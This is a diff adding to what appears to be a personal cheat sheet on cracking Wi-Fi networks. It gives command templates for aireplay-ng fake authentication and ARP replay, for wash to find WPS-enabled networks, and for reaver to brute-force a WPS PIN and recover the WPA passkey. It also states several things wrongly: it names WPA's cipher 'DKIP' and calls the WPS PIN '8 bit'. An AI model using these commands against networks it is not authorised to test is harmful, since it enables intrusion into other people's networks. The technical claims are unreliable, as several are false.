@@ -38,5 +38,18 @@ aircrack-ng [cap-file-name]
 
 ### aireplay-ng : Used to generate fake traffic. It comes handy if target wifi is not generating enough traffic
 ```
-aireplay-ng --fakeauth 0 -a [mac-of-AP] -h [mac-of wireless-adapter] [interface-name]
+aireplay-ng --fakeauth 0 -a [mac-of-AP] -h [mac-of wireless-adapter] [interface-name] : For assocaiation
+aireplay-ng --arpreplay  -b [mac-of-AP] -h [mac-of wireless-adapter] [interface-name]
+```
+
+### Cracking WPA/WPA2
+Only difference in encrption used for message integrity
+WPA: DKIP
+WPA2: CCMP
+
+WPS: Can be exploited. It was designed to simplify connecting to wireless. Only way to prevent against this is enabling PBC(Push button connect)
+
+```
+wash --interface [interface-name] : Shows all the wifi with wps enabled
+reaver --bssid [bssid] --channel [channel number] --interface [interface-name] -vvv --no-associate : Bruteforce 8 bit WPS pin which is then used to compute WPA Passkey
 ```
